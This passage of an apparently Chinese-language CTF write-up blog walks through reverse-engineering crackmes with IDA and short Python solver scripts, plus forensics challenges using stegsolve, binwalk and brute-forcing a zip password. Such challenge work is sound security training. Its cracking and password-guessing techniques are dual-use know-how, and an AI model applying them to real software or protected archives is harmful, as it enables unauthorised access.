<span class="number">2069</span>, <span class="number">2094</span>, <span class="number">2118</span>, <span class="number">2143</span>, <span class="number">2167</span>, <span class="number">2191</span>, <span class="number">2215</span>, <span class="number">2239</span>, <span class="number">2264</span>, <span class="number">2288</span>, <span class="number">2313</span>, <span class="number">2338</span>, <span class="number">2363</span>, <span class="number">2387</span>, <span class="number">2412</span>, <span class="number">2437</span>, <span class="number">2462</span>, <span class="number">2486</span>, <span class="number">2511</span>, <span class="number">2536</span>, <span class="number">2560</span>, <span class="number">2584</span>, <span class="number">2609</span>, <span class="number">2634</span>, <span class="number">2658</span>, <span class="number">2682</span>, <span class="number">2707</span>, <span class="number">2731</span>, <span class="number">2755</span>, <span class="number">2780</span>, <span class="number">2805</span>, <span class="number">2829</span>, <span class="number">2854</span>, <span class="number">2878</span>, <span class="number">2902</span>, <span class="number">2926</span>, <span class="number">2950</span>, <span class="number">2974</span>, <span class="number">2998</span>, <span class="number">3022</span>, <span class="number">3046</span>, <span class="number">3071</span>, <span class="number">3096</span>, <span class="number">3120</span>, <span class="number">3145</span>, <span class="number">3170</span>, <span class="number">3195</span>, <span class="number">3220</span>, <span class="number">3245</span>, <span class="number">3269</span>, <span class="number">3293</span>, <span class="number">3316</span>, <span class="number">3340</span>, <span class="number">3364</span>, <span class="number">3389</span>, <span class="number">3413</span>, <span class="number">3437</span>, <span class="number">3462</span>, <span class="number">3486</span>, <span class="number">3511</span>, <span class="number">3534</span>, <span class="number">3559</span>, <span class="number">3583</span>, <span class="number">3607</span>, <span class="number">3631</span>, <span class="number">3655</span>, <span class="number">3679</span>, <span class="number">3704</span>, <span class="number">3727</span>, <span class="number">3751</span>, <span class="number">3774</span>, <span class="number">3798</span>, <span class="number">3822</span>, <span class="number">3847</span>, <span class="number">3870</span>, <span class="number">3894</span>, <span class="number">3918</span>, <span class="number">3942</span>, <span class="number">3966</span>, <span class="number">3990</span>] <span class="comment">#最后一个是len(f_all)</span></span><br><span class="line">l2=[<span class="number">24</span>,<span class="number">72</span>,<span class="number">108</span>,<span class="number">129</span>,<span class="number">18</span>,<span class="number">92</span>,<span class="number">63</span>,<span class="number">162</span>,<span class="number">110</span>,<span class="number">156</span>,<span class="number">132</span>,<span class="number">101</span>,<span class="number">34</span>,<span class="number">143</span>,<span class="number">28</span>,<span class="number">136</span>,<span class="number">115</span>,<span class="number">114</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">69</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">127</span>,<span class="number">55</span>,<span class="number">58</span>,<span class="number">86</span>,<span class="number">149</span>,<span class="number">21</span>,<span class="number">41</span>,<span class="number">120</span>,<span class="number">142</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">88</span>,<span class="number">133</span>,<span class="number">161</span>,<span class="number">35</span>,<span class="number">137</span>,<span class="number">31</span>,<span class="number">3</span>,<span class="number">20</span>,<span class="number">113</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">91</span>,<span class="number">78</span>,<span class="number">102</span>,<span class="number">19</span>,<span class="number">135</span>,<span class="number">153</span>,<span class="number">105</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">9</span>,<span class="number">68</span>,<span class="number">64</span>,<span class="number">81</span>,<span class="number">93</span>,<span class="number">147</span>,<span class="number">67</span>,<span class="number">138</span>,<span class="number">160</span>,<span class="number">85</span>,<span class="number">106</span>,<span class="number">154</span>,<span class="number">75</span>,<span class="number">89</span>,<span class="number">66</span>,<span class="number">26</span>,<span class="number">141</span>,<span class="number">2</span>,<span class="number">98</span>,<span class="number">96</span>,<span class="number">124</span>,<span class="number">145</span>,<span class="number">84</span>,<span class="number">71</span>,<span class="number">15</span>,<span class="number">140</span>,<span class="number">90</span>,<span class="number">144</span>,<span class="number">100</span>,<span class="number">61</span>,<span class="number">131</span>,<span class="number">27</span>,<span class="number">23</span>,<span class="number">53</span>,<span class="number">40</span>,<span class="number">130</span>,<span class="number">47</span>,<span class="number">117</span>,<span class="number">148</span>,<span class="number">150</span>,<span class="number">50</span>,<span class="number">111</span>,<span class="number">122</span>,<span class="number">146</span>,<span class="number">57</span>,<span class="number">121</span>,<span class="number">123</span>,<span class="number">82</span>,<span class="number">45</span>,<span class="number">152</span>,<span class="number">109</span>,<span class="number">62</span>,<span class="number">70</span>,<span class="number">116</span>,<span class="number">77</span>,<span class="number">12</span>,<span class="number">139</span>,<span class="number">155</span>,<span class="number">80</span>,<span class="number">103</span>,<span class="number">13</span>,<span class="number">74</span>,<span class="number">16</span>,<span class="number">51</span>,<span class="number">94</span>,<span class="number">87</span>,<span class="number">97</span>,<span class="number">25</span>,<span class="number">151</span>,<span class="number">128</span>,<span class="number">54</span>,<span class="number">125</span>,<span class="number">112</span>,<span class="number">119</span>,<span class="number">118</span>,<span class="number">158</span>,<span class="number">99</span>,<span class="number">95</span>,<span class="number">4</span>,<span class="number">38</span>,<span class="number">79</span>,<span class="number">157</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">134</span>,<span class="number">30</span>,<span class="number">126</span>,<span class="number">1</span>,<span class="number">104</span>,<span class="number">52</span>,<span class="number">65</span>,<span class="number">44</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">163</span>,<span class="number">0</span>,<span class="number">76</span>,<span class="number">5</span>,<span class="number">60</span>,<span class="number">59</span>,<span class="number">159</span>,<span class="number">8</span>,<span class="number">49</span>,<span class="number">32</span>,<span class="number">43</span>,<span class="number">56</span>,<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">fname_list=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(l2)):</span><br><span class="line">s=f_all[l1[i]:l1[i+<span class="number">1</span>]]</span><br><span class="line">fname=l2[i]</span><br><span class="line"><span class="comment">#gz文件</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">r&#x27;out\%d.gz&#x27;</span> %fname,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(s)</span><br><span class="line">fname_list.append(fname)</span><br><span class="line">fname_list.sort() <span class="comment">#从小到大排序</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> fname <span class="keyword">in</span> fname_list:</span><br><span class="line">flag+=gzip.open(<span class="string">r&#x27;out\%d.gz&#x27;</span> %fname,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">foo()</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:33:51%20"></a></p><h2 id="挣脱牢笼"><a href="#挣脱牢笼" class="headerlink" title="挣脱牢笼"></a>挣脱牢笼</h2><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Waring-Up-100"><a href="#Waring-Up-100" class="headerlink" title="Waring Up(100)"></a>Waring Up(100)</h2><blockquote><p>Warming Up</p></blockquote><p>Crack the easy program crackme, the key is your correct inpu</p><p>Crack the easy program crackme, the key is your correct input<br>直接IDA打开，来到main_0()，程序主流程在这此函数里</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:37:08%20"></a></p><p>v4获取输入，v3为输入字串长度，然后进sub_401005()进行字串处理，sub_40100A()为结果比较。先看下结果比较函数：</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:39:04%20"></a></p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:40:05%20"></a></p><p>可以看出，处理过的输入与”VgobmndVlBVE”官串比较。<br>再看输入字串处理函数，sub_401005()直接跳到地址40DBF0。<br>关键处理操作如图：</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:41:33%20"></a></p><p>写个小脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">&quot;VgobmndVlBVE&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> index, item <span class="keyword">in</span> enumerate(target):</span><br><span class="line">result += chr(ord(item)^(((index)%<span class="number">3</span>)+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="到手的钥匙-100"><a href="#到手的钥匙-100" class="headerlink" title="到手的钥匙(100)"></a>到手的钥匙(100)</h2><blockquote><p>到手的钥匙。现在已经确定截获到一个对方用来传递密钥的程序，但是如何才能拿到密钥？</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:43:39%20"></a></p><p>一个是帐号 一个是密码</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/01:44:48%20"></a></p><p>屏幕输出一堆奇怪的东西<br>帐号+密码+这一堆  就是flag了</p><h2 id="忘记用户名-100"><a href="#忘记用户名-100" class="headerlink" title="忘记用户名(100)"></a>忘记用户名(100)</h2><blockquote><p>忘记用户名。过了好久，用户名都不记得了，难道只能重置了么</p></blockquote><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:55:34%20"></a></p><p> 做了简单的加减</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;ILoveXD&#x27;</span></span><br><span class="line">ct=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> a:</span><br><span class="line"> <span class="keyword">print</span> chr(ord(c)+<span class="number">7</span>-ct)</span><br><span class="line"> ct=ct+<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="Help-me-150"><a href="#Help-me-150" class="headerlink" title="Help me(150)"></a>Help me(150)</h2><blockquote><p>Help me</p></blockquote><p>What’s wrong with my program? Who can crack this? Do me a favor…</p><p>直接扔进IDA，如图：</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:11%20"></a></p><p>其中有些空代码，还有些不太正确的语句。程序是不能正常运行的。如开始处的v10,v0等。main()函数中前面一部分主要是一些打印语句，求字串长度及一些赋值操作。这里有四个赋值下面需要用到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dword_40CF70 &#x3D; 1;</span><br><span class="line">dword_40CF74 &#x3D; -1;</span><br><span class="line">dword_40CF78 &#x3D; -2;</span><br><span class="line">v3 &#x3D; lstrlenA(String);</span><br></pre></td></tr></table></figure><p>再看下面的if语句</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/08:59:40%20"></a></p><p>第一个if中的v3为String的长度，String为’rev3rs3_ana1ys1s’。里面是一个do…while语句，里面是一些if 语句，根据上面列出的赋值语句，直接到达下图的关键字串处理部分：</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:00:01%20"></a></p><p>现在逻辑就很清晰了<br>字串与9异或，以16进制形式输出结果。用python计算结果如图</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:10:48%20"></a></p><h2 id="捉迷藏-150"><a href="#捉迷藏-150" class="headerlink" title="捉迷藏(150)"></a>捉迷藏(150)</h2><blockquote><p>捉迷藏。文件一定要保存好，不要像这个程序一样随便一diu~  PS：建议在win32环境下测试</p></blockquote><p>用IDA打开 能看到用户名</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:13:38%20"></a></p><p>密码随便输入14个1，发现14个1变为base64编码和另一串比<br>下断点得到base64的编码，解码得到OnYourComputer</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:15:19%20"></a></p><p>sub_13D1D00内会把用户名+密码+ArvinShow存到<br>系统临时目录/flag.jpg，flag即为</p><p><code>FindKeyOnYourComputerArvinShow</code></p><h2 id="移动迷宫-200"><a href="#移动迷宫-200" class="headerlink" title="移动迷宫(200)"></a>移动迷宫(200)</h2><blockquote><p>移动迷宫。当赶到的时候发现对方已经提前接头了，但在现场遗留了一个U盘并恢复出了一个登陆程序，如何才能拿到密钥？</p></blockquote><p>程序就是个简单的走迷宫<br>输入的东西，进行各简单变化，对应于走的方向</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:21:11%20"></a></p><p>走的逻辑是</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:22:02%20"></a></p><p>根据坐标生成方向即可，逆代码如下</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">map_info = <span class="string">&quot;***********####******#**#*****##*##********#*********#*#####***###***#*********#*********#********##&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">pos_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(map_info)):</span><br><span class="line">result += map_info[i]</span><br><span class="line"></span><br><span class="line">y = (i)%<span class="number">10</span></span><br><span class="line">x = i/<span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> (i+<span class="number">1</span>)%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">result += <span class="string">&quot;\n&quot;</span></span><br><span class="line"><span class="keyword">if</span> map_info[i] == <span class="string">&quot;#&quot;</span>:</span><br><span class="line">pos_list.append((x, y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> map_info[<span class="number">0x28</span>]</span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> pos_list</span><br><span class="line"></span><br><span class="line">last = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">way_list = []</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line">way_list.append((<span class="number">1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">0</span>,<span class="number">1</span>))</span><br><span class="line">way_list.append((<span class="number">-1</span>,<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> len(way_list)</span><br><span class="line">map_dic = &#123;&#125;</span><br><span class="line">map_dic[(<span class="number">-1</span>, <span class="number">0</span>)] = <span class="number">3</span></span><br><span class="line">map_dic[(<span class="number">1</span>, <span class="number">0</span>)] = <span class="number">4</span></span><br><span class="line">map_dic[(<span class="number">0</span>, <span class="number">-1</span>)] = <span class="number">1</span></span><br><span class="line">map_dic[(<span class="number">0</span>, <span class="number">1</span>)] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> way_list:</span><br><span class="line">result.append(map_dic[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">way_key = <span class="string">&quot;&quot;&quot;0A1B</span></span><br><span class="line"><span class="string">a2b3</span></span><br><span class="line"><span class="string">4C5D</span></span><br><span class="line"><span class="string">c6d7</span></span><br><span class="line"><span class="string">8E9F</span></span><br><span class="line"><span class="string">e0f1&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">way_key = way_key.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span> len(result)</span><br><span class="line">result_info = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">result_info += way_key[j][result[i*<span class="number">6</span>+j]<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> way_key</span><br><span class="line"><span class="keyword">print</span> result_info</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:25:54%20"></a></p><h2 id="Do-something-200"><a href="#Do-something-200" class="headerlink" title="Do something(200)"></a>Do something(200)</h2><blockquote><p>Do something登录程序后收到了一张图片，这其中会有什么蹊跷？已更新，可以继续做题～binwalk从png中分离exe</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">程序让输入用户名 符合一系列条件</span><br><span class="line">a1&#x3D;a9</span><br><span class="line">a1&#x3D;aa</span><br><span class="line">a2&#x3D;ab</span><br><span class="line">a3&#x3D;a5</span><br><span class="line">a4&#x3D;a6</span><br><span class="line">ac&#x3D;5</span><br><span class="line">a8&#x3D;3*a 24</span><br><span class="line">ad&gt;5*a 4b</span><br><span class="line">ae&#x3D;2*a 1a</span><br><span class="line">a4&gt;3*a 27</span><br><span class="line">a1&gt;a4</span><br><span class="line">21&gt;a1</span><br><span class="line">a1&#x3D;ad+a7</span><br><span class="line">a7&#x3D;2*a 20</span><br><span class="line">a3&gt;4*a 3c</span><br><span class="line">a7&gt;a3</span><br><span class="line">a3%3&#x3D;0</span><br><span class="line">a2&gt;7</span><br><span class="line">a3&gt;a2</span><br></pre></td></tr></table></figure><p>写给脚本跑一下 </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line">a1=<span class="number">0</span></span><br><span class="line">a2=<span class="number">0</span></span><br><span class="line">a3=<span class="number">0</span></span><br><span class="line">a4=<span class="number">0</span></span><br><span class="line">a5=<span class="number">0</span></span><br><span class="line">a6=<span class="number">0</span></span><br><span class="line">a7=<span class="number">0</span></span><br><span class="line">a8=<span class="number">0</span></span><br><span class="line">a9=<span class="number">0</span></span><br><span class="line">a10=<span class="number">0</span></span><br><span class="line">a11=<span class="number">0</span></span><br><span class="line">a12=<span class="number">5</span></span><br><span class="line">a13=<span class="number">0</span></span><br><span class="line">a14=<span class="number">0</span></span><br><span class="line">a15=<span class="number">0</span></span><br><span class="line">a16=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a1 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line"> <span class="keyword">if</span> <span class="number">0x15</span>&lt;=a1:</span><br><span class="line">  <span class="keyword">continue</span></span><br><span class="line"> a9=a1</span><br><span class="line"> a10=a1</span><br><span class="line"> <span class="keyword">for</span> a2 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">  a11=a2</span><br><span class="line">  <span class="keyword">if</span> a2&lt;=<span class="number">7</span>:</span><br><span class="line">   <span class="keyword">continue</span></span><br><span class="line">  <span class="keyword">for</span> a3 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">   <span class="keyword">if</span> a3%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">   a5=a3</span><br><span class="line">   <span class="keyword">if</span> a3&lt;=a2:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">   <span class="keyword">for</span> a4 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">    a6=a4</span><br><span class="line">    <span class="keyword">if</span> a1&lt;=a4:</span><br><span class="line">     <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> a16 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">     a7=<span class="number">2</span>*a16</span><br><span class="line">     <span class="keyword">if</span> a1&gt;=a7:</span><br><span class="line">      ad=a1-a7</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">     <span class="keyword">if</span> a7&lt;=a3:</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">     a12=<span class="number">5</span></span><br><span class="line">     <span class="keyword">if</span> <span class="number">1</span>==<span class="number">1</span>:</span><br><span class="line">      a8=<span class="number">3</span>*a12</span><br><span class="line">      <span class="keyword">for</span> a13 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">       a14=<span class="number">2</span>*a13</span><br><span class="line">       <span class="keyword">if</span> a4&lt;=<span class="number">3</span>*a13:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">for</span> a15 <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">27</span>):</span><br><span class="line">        <span class="keyword">if</span> a13&lt;=<span class="number">5</span>*a15:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> a3&lt;=<span class="number">4</span>*a15:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">print</span> chr(a1+<span class="number">96</span>)+chr(a2+<span class="number">96</span>)+chr(a3+<span class="number">96</span>)+chr(a4+<span class="number">96</span>)+chr(a5+<span class="number">96</span>)+chr(a6+<span class="number">96</span>)+chr(a7+<span class="number">96</span>)+chr(a8+<span class="number">96</span>)+chr(a9+<span class="number">96</span>)+chr(a10+<span class="number">96</span>)+chr(a11+<span class="number">96</span>)+chr(a12+<span class="number">96</span>)+chr(a13+<span class="number">96</span>)+chr(a14+<span class="number">96</span>)+chr(a15+<span class="number">96</span>)+chr(a16+<span class="number">96</span>)</span><br></pre></td></tr></table></figure><p>得到 </p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:36:03%20"></a></p><p>访问程序得到一个地址  访问地址  *<em><a href="http://reverse/">http://reverse</a>.****</em>.cn/galfehttonsisiht.php**<br>就能得到flag了</p><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="蒲公英的约定"><a href="#蒲公英的约定" class="headerlink" title="蒲公英的约定"></a>蒲公英的约定</h2><blockquote><p>蒲公英的约定<br>100<br>题目描述？小学篱笆旁的 蒲公英~</p></blockquote><p>这个简单 使用stegsolve打开</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:42:55%20"></a></p><p>能看到一个二维码 </p><p>反转一下颜色 然后 扫描就得到一个类似base64字符串，但其实是base32字符串，用python的base64.b32decode即可得到flag</p><h2 id="什么鬼-100"><a href="#什么鬼-100" class="headerlink" title="什么鬼(100)"></a>什么鬼(100)</h2><blockquote><p>什么鬼</p></blockquote><p>你瞅啥？</p><p>binwal解压出一个压缩包</p><p>压缩包是有密码的  注释上写的4位数<br>爆破  得到密码 19bZ<br>打开压缩包是一个破损的二维码 PS一下就好了</p><p><a 